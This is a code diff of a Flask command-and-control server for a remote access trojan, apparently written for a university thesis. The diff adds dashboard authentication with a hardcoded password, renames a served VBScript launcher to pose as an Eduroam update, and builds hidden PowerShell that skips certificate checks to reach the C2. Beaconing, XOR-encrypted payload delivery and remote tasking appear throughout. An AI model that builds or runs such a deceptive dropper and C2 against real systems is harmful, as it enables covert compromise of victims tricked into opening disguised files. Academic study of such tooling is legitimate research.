@@ -5,12 +5,34 @@ Multi-agent, URI pool randomizzato, payload XOR auto-cifrato su /update_dll.
 Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 """
 
-from flask import Flask, request, jsonify, send_file, render_template_string
-import os, json, re, threading, time, secrets
+from flask import Flask, request, jsonify, send_file, render_template_string, Response
+from functools import wraps
+import os, json, re, threading, time, secrets, hashlib
 from datetime import datetime
 from pathlib import Path
 
 app = Flask(__name__)
+
+# ── Autenticazione dashboard ─────────────────────────────────────────
+# Credenziali per accedere alla dashboard e alle API di gestione.
+# La password viene hashata con SHA-256 per non lasciarla in chiaro nel sorgente.
+ADMIN_USER = "admin"
+ADMIN_PASS_HASH = hashlib.sha256(b"R4tTesi2026!").hexdigest()   # cambiare in produzione
+
+def _check_auth(username: str, password: str) -> bool:
+    return (username == ADMIN_USER and
+            hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASS_HASH)
+
+def _auth_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth = request.authorization
+        if not auth or not _check_auth(auth.username, auth.password):
+            return Response(
+                "Accesso negato. Credenziali richieste.\n", 401,
+                {'WWW-Authenticate': 'Basic realm="C2 Dashboard"'})
+        return f(*args, **kwargs)
+    return decorated
 
 # ── Chiave XOR per cifratura payload ─────────────────────────────────
 XOR_KEY = bytes.fromhex('d683f9ce3e3d091215b422cfef509f00279815c0ee7451687c615599e743ee28')
@@ -222,11 +244,12 @@ def serve_stager():
 @app.route('/launcher')
 def serve_launcher():
     """
-    Serve UnisaCertUpdate.vbs — vettore via PDF link.
+    Serve EduroamAggiornamento.vbs — vettore via PDF link.
     .vbs → wscript.exe → nessuna finestra console visibile (a differenza di .bat).
     Lancia PowerShell completamente nascosto (windowStyle=0).
     """
-    c2 = "https://192.168.122.47:443"
+    host = request.host.split(':')[0]
+    c2 = f"https://{host}:443"
     ps_cmd = (
         "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"
         "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
@@ -245,7 +268,7 @@ def serve_launcher():
     return Response(
         vbs,
         mimetype='application/octet-stream',
-        headers={'Content-Disposition': 'attachment; filename="UnisaCertUpdate.vbs"'}
+        headers={'Content-Disposition': 'attachment; filename="EduroamAggiornamento.vbs"'}
     )
     
 @app.route('/sondaggio', methods=['GET'])
@@ -287,6 +310,7 @@ def serve_stego():
 # ══════════════════════════════════════════════════════════════════════
 
 @app.route('/api/agents', methods=['GET'])
+@_auth_required
 def api_agents():
     with agents_lock:
         result = {}
@@ -303,6 +327,7 @@ def api_agents():
         return jsonify(result)
 
 @app.route('/api/send', methods=['POST'])
+@_auth_required
 def api_send():
     data  = request.get_json()
     aid   = data.get('aid')
@@ -317,6 +342,7 @@ def api_send():
     return jsonify({"status": "ok"})
 
 @app.route('/api/results/<aid>', methods=['GET'])
+@_auth_required
 def api_results(aid):
     with agents_lock:
         if aid not in agents:
@@ -530,6 +556,7 @@ loadAgents();
 """
 
 @app.route('/', methods=['GET'])
+@_auth_required
 def dashboard():
     return render_template_string(DASHBOARD)
 
@@ -549,7 +576,7 @@ if __name__ == '__main__':
 
     print(f"\n{'='*60}")
     print(f"  RAT C2 Server v2")
-    print(f"  Dashboard: https://192.168.122.47/")
+    print(f"  Dashboard: https://0.0.0.0/  (auth: {ADMIN_USER} / ****)")
     print(f"  Beacon URI pool: {len(BEACON_URIS)} endpoints")
     print(f"  Result URI pool: {len(RESULT_URIS)} endpoints")
     print(f"  XOR Key: {XOR_KEY.hex()[:16]}...")
